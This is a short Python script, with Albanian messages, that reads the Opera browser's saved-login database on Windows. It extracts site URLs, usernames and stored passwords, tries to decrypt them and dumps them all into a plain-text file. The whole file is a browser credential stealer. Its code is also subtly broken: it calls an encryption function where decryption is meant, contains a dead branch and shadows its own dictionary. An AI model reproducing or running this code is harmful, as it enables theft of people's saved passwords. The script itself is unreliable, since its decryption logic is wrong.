import os
import sqlite3
import win32crypt

#path to user's login data
from pip._vendor.distlib.compat import raw_input

data_path = os.path.expanduser('~') + "\AppData\Roaming\Opera Software\Opera Stable"

login_db = os.path.join(data_path, 'Login Data')

#db connect and query
c = sqlite3.connect(login_db)
cursor = c.cursor()
select_statement = "SELECT origin_url, username_value, password_value FROM logins"
cursor.execute(select_statement)

login_data = cursor.fetchall()

#URL: credentials dictionary
credentials = {}

#decrytping the password
for url, user_name, pwd, in login_data:
	pwd = win32crypt.CryptProtectData(pwd) #This returns a tuple description and the password
	credentials[url] = (user_name, pwd[0])

#writing to a text file (CAUTION: Don't leave this text file around!)

with open('pwd.txt', 'w') as f:
	for url, credentials in credentials.items():
		if 1==2:
			f.write("\n"+url+"\n"+"username nuk u gjet | password nuk u gjet \n")
		else:
			f.write("\n"+url +"\n"+credentials[0]+ " | "+bytes(credentials[1]).decode('utf-8')+"\n")
	print (" Te dhenat u transferuan ne pwd.txt!")
